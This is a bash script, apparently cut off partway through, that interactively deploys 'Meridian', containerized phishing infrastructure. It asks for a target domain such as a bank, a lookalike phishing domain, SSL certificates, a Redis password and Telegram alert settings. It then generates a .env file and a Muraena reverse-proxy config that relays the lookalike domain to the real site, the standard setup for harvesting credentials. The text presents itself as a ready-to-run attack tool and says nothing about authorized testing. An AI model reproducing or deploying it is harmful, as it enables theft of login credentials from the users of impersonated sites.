#!/bin/bash
################################################################################
# MERIDIAN INTERACTIVE CONTAINERIZED DEPLOYMENT
# Prompts for configuration and deploys containerized phishing infrastructure
################################################################################

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_DIR="$SCRIPT_DIR/config"
TEMPLATE_DIR="$CONFIG_DIR/templates"
GENERATED_DIR="$CONFIG_DIR/generated"
LOG_FILE="$SCRIPT_DIR/logs/deploy_$(date +%Y%m%d_%H%M%S).log"

# Create necessary directories
mkdir -p "$GENERATED_DIR" "$SCRIPT_DIR/logs" "$SCRIPT_DIR/ssl"

################################################################################
# LOGGING FUNCTIONS
################################################################################

log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case "$level" in
        INFO)    echo -e "${CYAN}[INFO]${NC} $message" ;;
        SUCCESS) echo -e "${GREEN}[✓]${NC} $message" ;;
        WARN)    echo -e "${YELLOW}[⚠]${NC} $message" ;;
        ERROR)   echo -e "${RED}[✗]${NC} $message" ;;
        STEP)    echo -e "${BOLD}${BLUE}[→]${NC} $message" ;;
        INPUT)   echo -e "${CYAN}[?]${NC} $message" ;;
    esac
    
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE" 2>/dev/null || true
}

banner() {
    clear
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║           🌊 MERIDIAN CONTAINERIZED DEPLOYMENT 🌊             ║
║                                                               ║
║        Interactive Setup for Phishing Infrastructure          ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo ""
}

################################################################################
# INPUT VALIDATION FUNCTIONS
################################################################################

validate_domain() {
    local domain="$1"
    if [[ ! "$domain" =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$ ]]; then
        return 1
    fi
    return 0
}

validate_email() {
    local email="$1"
    if [[ ! "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
        return 1
    fi
    return 0
}

validate_port() {
    local port="$1"
    if [[ ! "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
        return 1
    fi
    return 0
}

################################################################################
# USER INPUT COLLECTION
################################################################################

collect_user_inputs() {
    log STEP "Configuration Setup"
    echo ""
    
    # Target Domain
    while true; do
        log INPUT "Enter the TARGET domain (e.g., example.com, bank.com):"
        read -r TARGET_DOMAIN
        if validate_domain "$TARGET_DOMAIN"; then
            log SUCCESS "Target domain: $TARGET_DOMAIN"
            break
        else
            log ERROR "Invalid domain format. Please try again."
        fi
    done
    echo ""
    
    # Phishing Domain
    while true; do
        log INPUT "Enter the PHISHING domain (e.g., examp1e.com, bankk.com):"
        read -r PHISHING_DOMAIN
        if validate_domain "$PHISHING_DOMAIN"; then
            log SUCCESS "Phishing domain: $PHISHING_DOMAIN"
            break
        else
            log ERROR "Invalid domain format. Please try again."
        fi
    done
    echo ""
    
    # Target Subdomains
    log INPUT "Enter target subdomains (comma-separated, or press Enter to skip):"
    log INFO "Example: www.${TARGET_DOMAIN},api.${TARGET_DOMAIN}"
    read -r SUBDOMAINS_INPUT
    
    if [ -n "$SUBDOMAINS_INPUT" ]; then
        IFS=',' read -ra SUBDOMAINS <<< "$SUBDOMAINS_INPUT"
        TARGET_SUBDOMAIN_1="${SUBDOMAINS[0]:-www.${TARGET_DOMAIN}}"
        TARGET_SUBDOMAIN_2="${SUBDOMAINS[1]:-api.${TARGET_DOMAIN}}"
    else
        TARGET_SUBDOMAIN_1="www.${TARGET_DOMAIN}"
        TARGET_SUBDOMAIN_2="api.${TARGET_DOMAIN}"
    fi
    log SUCCESS "Subdomains configured"
    echo ""
    
    # SSL Configuration
    log INPUT "SSL Certificate Setup:"
    echo "  1) Let's Encrypt (automatic, requires valid DNS)"
    echo "  2) Self-signed (for testing)"
    echo "  3) Custom (provide your own certificates)"
    read -p "Select option [1-3]: " SSL_CHOICE
    
    case "$SSL_CHOICE" in
        1)
            SSL_MODE="letsencrypt"
            while true; do
                log INPUT "Enter email for Let's Encrypt:"
                read -r LETSENCRYPT_EMAIL
                if validate_email "$LETSENCRYPT_EMAIL"; then
                    log SUCCESS "Email: $LETSENCRYPT_EMAIL"
                    break
                else
                    log ERROR "Invalid email format. Please try again."
                fi
            done
            ;;
        2)
            SSL_MODE="selfsigned"
            LETSENCRYPT_EMAIL=""
            log SUCCESS "Self-signed certificate will be generated"
            ;;
        3)
            SSL_MODE="custom"
            LETSENCRYPT_EMAIL=""
            log INFO "Place your certificates in ./ssl/ directory:"
            log INFO "  - fullchain.pem"
            log INFO "  - privkey.pem"
            ;;
        *)
            SSL_MODE="selfsigned"
            log WARN "Invalid choice. Using self-signed certificate."
            ;;
    esac
    echo ""
    
    # Redis Password
    log INPUT "Enter Redis password (or press Enter for auto-generated):"
    read -r REDIS_PASSWORD
    if [ -z "$REDIS_PASSWORD" ]; then
        REDIS_PASSWORD="meridian_$(openssl rand -hex 16)"
        log SUCCESS "Generated Redis password"
    else
        log SUCCESS "Redis password set"
    fi
    echo ""
    
    # Telegram Notifications (Optional)
    log INPUT "Enable Telegram notifications? (y/N):"
    read -r TELEGRAM_CHOICE
    
    if [[ "$TELEGRAM_CHOICE" =~ ^[Yy]$ ]]; then
        TELEGRAM_ENABLED="true"
        log INPUT "Enter Telegram Bot Token:"
        read -r TELEGRAM_BOT_TOKEN
        log INPUT "Enter Telegram Chat IDs (comma-separated):"
        read -r TELEGRAM_CHAT_IDS_INPUT
        TELEGRAM_CHAT_IDS=$(echo "$TELEGRAM_CHAT_IDS_INPUT" | sed 's/,/", "/g' | sed 's/^/"/' | sed 's/$/"/')
        log SUCCESS "Telegram notifications enabled"
    else
        TELEGRAM_ENABLED="false"
        TELEGRAM_BOT_TOKEN=""
        TELEGRAM_CHAT_IDS=""
        log INFO "Telegram notifications disabled"
    fi
    echo ""
    
    # Campaign Name
    log INPUT "Enter campaign name (or press Enter for auto-generated):"
    read -r CAMPAIGN_NAME
    if [ -z "$CAMPAIGN_NAME" ]; then
        CAMPAIGN_NAME="campaign_$(date +%Y%m%d_%H%M%S)"
        log SUCCESS "Generated campaign name: $CAMPAIGN_NAME"
    else
        log SUCCESS "Campaign name: $CAMPAIGN_NAME"
    fi
    echo ""
}

################################################################################
# CONFIGURATION GENERATION
################################################################################

generate_env_file() {
    log STEP "Generating .env file..."
    
    cat > "$SCRIPT_DIR/.env" << EOF
# Meridian Deployment Configuration
# Generated: $(date -u +"%Y-%m-%dT%H:%M:%SZ")

# Domain Configuration
PHISHING_DOMAIN=${PHISHING_DOMAIN}
TARGET_DOMAIN=${TARGET_DOMAIN}
TARGET_SUBDOMAIN_1=${TARGET_SUBDOMAIN_1}
TARGET_SUBDOMAIN_2=${TARGET_SUBDOMAIN_2}

# SSL Configuration
LETSENCRYPT_EMAIL=${LETSENCRYPT_EMAIL}
SSL_MODE=${SSL_MODE}

# Redis Configuration
REDIS_PASSWORD=${REDIS_PASSWORD}

# Service Ports
MURAENA_HTTP_PORT=80
MURAENA_HTTPS_PORT=443
NECRO_API_PORT=3000
REDIS_PORT=6379
WEB_PANEL_PORT=8080

# Telegram Notifications
TELEGRAM_ENABLED=${TELEGRAM_ENABLED}
TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}
TELEGRAM_CHAT_IDS=${TELEGRAM_CHAT_IDS}

# Deployment Metadata
CAMPAIGN_NAME=${CAMPAIGN_NAME}
DEPLOY_DATE=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
DEPLOY_USER=${USER}
EOF
    
    log SUCCESS ".env file created"
}

generate_muraena_config() {
    log STEP "Generating Muraena configuration..."
    
    # Use template if exists, otherwise create basic config
    if [ -f "$TEMPLATE_DIR/muraena_config.toml.template" ]; then
        sed -e "s|{{PHISHING_DOMAIN}}|${PHISHING_DOMAIN}|g" \
            -e "s|{{TARGET_DOMAIN}}|${TARGET_DOMAIN}|g" \
            -e "s|{{TARGET_SUBDOMAIN_1}}|${TARGET_SUBDOMAIN_1}|g" \
            -e "s|{{TARGET_SUBDOMAIN_2}}|${TARGET_SUBDOMAIN_2}|g" \
            -e "s|{{REDIS_PASSWORD}}|${REDIS_PASSWORD}|g" \
            -e "s|{{TELEGRAM_ENABLED}}|${TELEGRAM_ENABLED}|g" \
            -e "s|{{TELEGRAM_BOT_TOKEN}}|${TELEGRAM_BOT_TOKEN}|g" \
            -e "s|{{TELEGRAM_CHAT_IDS}}|${TELEGRAM_CHAT_IDS}|g" \
            "$TEMPLATE_DIR/muraena_config.toml.template" > "$GENERATED_DIR/muraena_config.toml"
    else
        # Create basic config if template doesn't exist
        cat > "$GENERATED_DIR/muraena_config.toml" << EOF
[proxy]
    phishing = "${PHISHING_DOMAIN}"
    destination = "${TARGET_DOMAIN}"
    IP = "0.0.0.0"
    port = 443
    
    [proxy.HTTPtoHTTPS]
    enable = true
    HTTPport = 80
